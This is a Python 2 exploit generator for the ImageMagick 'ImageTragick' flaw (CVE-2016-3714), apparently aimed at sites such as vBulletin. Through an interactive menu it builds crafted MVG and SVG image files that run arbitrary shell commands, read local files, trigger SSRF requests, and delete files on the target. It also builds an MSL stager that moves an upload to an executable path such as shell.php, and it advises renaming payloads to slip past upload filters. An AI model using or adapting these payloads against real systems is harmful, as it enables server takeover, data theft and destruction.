#!/usr/bin/env python
#
# Imagemagick Payload Builder
# By: Hood3dRob1n
#
# Targets: CVE-2016-3714
# Affected: Imagick <= 3.3.0 && PHP >= 5.4
#
# imagick_payload vs vBulletin 4.x w/Imagemagick Enabled
#    http://i.imgur.com/NIfEgvp.png
#    http://i.imgur.com/IYvPbfx.png
#    http://i.imgur.com/BNRIaSw.png
#

import optparse, os, sys
from classes.colors import *

def banner():
  cls();
  print red("\nImagemagick Payload Builder");
  print blue("By") + white(": Hood3dRob1n");


def cls():
  if os.name == 'nt' or sys.platform.startswith('win'):
    os.system('cls');
  else:
    os.system('clear');


def build_mvg_rce_payload(cmd, output):
  """
      Generates output file with embedded payload using MVG format
      Payload triggers command exec when called by Imagemagick's convert bin
      Payload stored to ./output/ directory

      cmd = OS Command to run as payload
      output = filename used to save payload output
  """
  try:
    fh = open(outdir+output, "w+");
    fh.write("push graphic-context\n");
    fh.write("viewbox 0 0 640 480\n");
    fh.write("fill 'url(https://127.0.0.1/image.jpg\"|%s\")'\n" % cmd);
    fh.write("pop graphic-context")
    fh.close()
  except Exception:
    return False
  return True


def build_svg_rce_payload(cmd, output):
  """
      Generates output file with embedded payload using SVG format
      Payload triggers command exec when called by Imagemagick's convert bin
      Payload stored to ./output/ directory

      cmd = OS Command to run as payload
      output = filename used to save payload output
  """
  try:
    fh = open(outdir+output, "wb+");
    fh.write("<?xml version=\"1.0\" standalone=\"no\"?>\n");
    fh.write("<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n");
    fh.write("\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n'");
    fh.write("<svg width=\"640px\" height=\"480px\" version=\"1.1\"\n");
    fh.write("xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\n");
    fh.write("\"http://www.w3.org/1999/xlink\">\n")
    fh.write("<image xlink:href=\"https://127.0.0.1/image.jpg\"|%s\"\n" % cmd);
    fh.write("x=\"0\" y=\"0\" height=\"640px\" width=\"480px\"/>\n");
    fh.write("</svg>");
    fh.close()
  except Exception:
    return False
  return True


def build_mvg_read_payload(filename, output):
  """
      Generates output file with embedded payload using MVG format
      Payload triggers a local file disclosure when called by Imagemagick's convert bin
      The converted image contains the rendered content from the local file
      Payload stored to ./output/ directory

      filename = The full system path to file to read and leak
      output = filename used to save payload output
  """
  try:
    fh = open(outdir+output, "wb+");
    fh.write("push graphic-context\n");
    fh.write("viewbox 0 0 640 480\n");
    fh.write("image over 0,0 0,0 'label:@%s'\n" % filename);
    fh.write("pop graphic-context")
    fh.close()
  except Exception:
    return False
  return True


def build_mvg_ssrf_payload(url, output):
  """
      Generates output file with embedded payload using MVG format
      Payload triggers a HTTP request when called by Imagemagick's convert bin
      This can be used to confirm vulnerability or to perform SSRF attacks
      Payload stored to ./output/ directory

      url = URL to send HTTP request to
      output = filename used to save payload output
  """
  try:
    fh = open(outdir+output, "wb+");
    fh.write("push graphic-context\n");
    fh.write("viewbox 0 0 640 480\n");
    fh.write("fill 'url(%s)'\n" % url);
    fh.write("pop graphic-context")
    fh.close()
  except Exception:
    return False
  return True


def build_mvg_move_payload(mslpath, source, destination, output):
  """
      Generates two output files
        %output%_move.mvg with embedded payload using MVG format to call %output%_move.txt
        %output%_move.msl_stager.txt which has embedded XML
	  => tells MVG file what to read (source) and where to re-write (destination)

      Payload triggers as the .MVG file is called by Imagemagick's convert bin
        It will then trigger MSL protocol wrapper to call our _move.txt file
        This then loads XML from file, which results in source being moved to destination

      This can be used to move an uploaded image with embedded payload to executable format
	i.e. to beat uploaders and move /tmp/image.gif to /var/www/html/shell.php

      Payload stored to ./output/ directory

      mslpath = the target system path to our %output%_move.txt payload
      source  = the target system path to our source file to move
      destination  = the final target system path to move source file to
      output = base filename used to save payload outputs
  """
  try:
    fh = open(outdir+output+"_move.mvg", "wb+");
    fh.write("push graphic-context\n");
    fh.write("viewbox 0 0 640 480\n");
    fh.write("image over 0,0 0,0 'msl:%s'\n" % mslpath);
    fh.write("pop graphic-context")
    fh.close()

    fh = open(outdir+output+"_move.msl_stager.txt", "wb+");
    fh.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fh.write("<image>\n");
    fh.write("<read filename=\"%s\" />\n" % source);
    fh.write("<write filename=\"%s\" />\n" % destination);
    fh.write("</image>")
    fh.close()
  except Exception:
    return False
  return True


def build_mvg_delete_payload(filename, output):
  """
      Generates output file with embedded payload using MVG format
      Payload triggers a local file deletion when called by Imagemagick's convert bin
      This can be used to delete files on the target system
      Payload stored to ./output/ directory

      filename = The full system path to file to delete
      output = filename used to save payload output
  """
  try:
    fh = open(outdir+output, "w+");
    fh.write("push graphic-context\n");
    fh.write("viewbox 0 0 640 480\n");
    fh.write("image over 0,0 0,0 'ephemeral:%s'\n" % filename);
    fh.write("pop graphic-context")
    fh.close()
  except Exception:
    return False
  return True


def build_help():
  """
      Displays payload builder options
  """
  print
  print white(underline("Imagick Payload Builder Options:"));
  print green("      cmd") + white(" => ") + green("Build Payload to Execute OS Command");
  print green("     read") + white(" => ") + green("Build Payload to Read File");
  print green("     move") + white(" => ") + green("Build Payload to Move a File");
  print green("   delete") + white(" => ") + green("Build Payload to Delete a File");
  print green("     ssrf") + white(" => ") + green("Build Payload for SSRF Request");
  print green("     help") + white(" => ") + green("Help Menu");
  print green("     exit") + white(" => ") + green("Exit Shell");
  print


def main():
  while 1:
    build_help();
    selection = raw_input(white("   Enter Selection: "))
    if selection.lower().strip() == "exit":
      break;
    elif selection.lower().strip() == "cmd" or selection.lower().strip() == "command":
      while 1:
        print
        answer = raw_input(white("   Enter Command to Embed in Payload: "));
        if answer.strip() == "":
          error("Need command to embed in payload....\n")
        else:
          break;
      print
      pay1=False; pay2=False;
      if build_mvg_rce_payload(answer.strip(), "mvg_rce.mvg"): pay1=True;
      if build_svg_rce_payload(answer.strip(), "svg_rce.svg"): pay2=True;
      if pay1 or pay2:
        good("Payload can be renamed as needed to bypass filetype restrictions...");
        if pay1:
          pad(); good("Payload 1 Saved To: %smvg_rce.mvg" % outdir);
        if pay2:
          pad(); good("Payload 2 Saved To: %ssvg_rce.svg" % outdir);
        print;
      else:
        bad("Problem building payloads...\n");
    elif selection.lower().strip() == "read":
      while 1:
        print
        answer = raw_input(white("   Enter Full Path to File to Read: "));
        if answer.strip() == "":
          error("Need file path to read, to embed in payload....\n")
        else:
          break;
      print
      if build_mvg_read_payload(answer.strip(), "mvg_read.mvg"):
          good("Payload Saved To: %smvg_read.mvg\n" % outdir);
      else:
        bad("Problem building payloads...\n");
    elif selection.lower().strip() == "move":
      while 1:
        print
        answer = raw_input(white("   Enter Full Path to MSL Stager File: "));
        if answer.strip() == "":
          error("Need file path for MSL protocol wrapper to act as stager....\n")
        else:
          while 1:
            print
            answer2 = raw_input(white("   Enter Full Path to Source File: "));
            if answer2.strip() == "":
              error("Need source file path we want to move....\n")
            else:
              while 1:
                print
                answer3 = raw_input(white("   Enter Full Destination Path: "));
                if answer3.strip() == "":
                  error("Need source file path we want to move....\n")
                else:
                  break;
              break;
          break;
      print
      if build_mvg_move_payload(answer.strip(), answer2.strip(), answer3.strip(), "mvpayload"):
        good("Payloads Saved To:\n\t%smvpayload_move.mvg\n\t%smvpayload_move.msl_stager.txt\n" % (outdir, outdir));
      else:
        bad("Problem building payloads...\n");
    elif selection.lower().strip() == "delete":
      while 1:
        print
        answer = raw_input(white("   Enter Full Path to File to Delete: "));
        if answer.strip() == "":
          error("Need file path to delete, to embed in payload....\n")
        else:
          break;
      print
      if build_mvg_delete_payload(answer.strip(), "mvg_delete.mvg"):
        good("Payload Saved To: %smvg_delete.mvg\n" % outdir);
      else:
        bad("Problem building payload...\n");
    elif selection.lower().strip() == "ssrf":
      while 1:
        print
        answer = raw_input(white("   Enter URL for SSRF Request: "));
        if answer.strip() == "":
          error("Need URL, to embed SSRF payload....\n")
        else:
          break;
      print
      if build_mvg_ssrf_payload(answer.strip(), "mvg_ssrf.mvg"):
          pad(); good("Payload Saved To: %smvg_ssrf.mvg\n" % outdir);
      else:
        bad("Problem building payload...\n");
    elif selection.lower().strip() == "help":
      pass
    else:
      error("Unknown Command: %s" % selection.strip())
      pad(); bad("Please enter a valid selection....\n\n")
  print
  good("Good Bye!\n\n");

homedir = os.path.dirname(os.path.abspath(__file__)) + "/";
outdir  = homedir + "output/";
if not os.path.isfile(outdir) and not os.path.isdir(outdir):
  os.mkdir(outdir); 

# Time for the magic show
if __name__ == "__main__":
  try:
    main();

  except KeyboardInterrupt:
    print "\n";
    print red("[") + white("WARNING") + red("]") + white(" CTRL+C, closing session...\n\n");
    sys.exit();

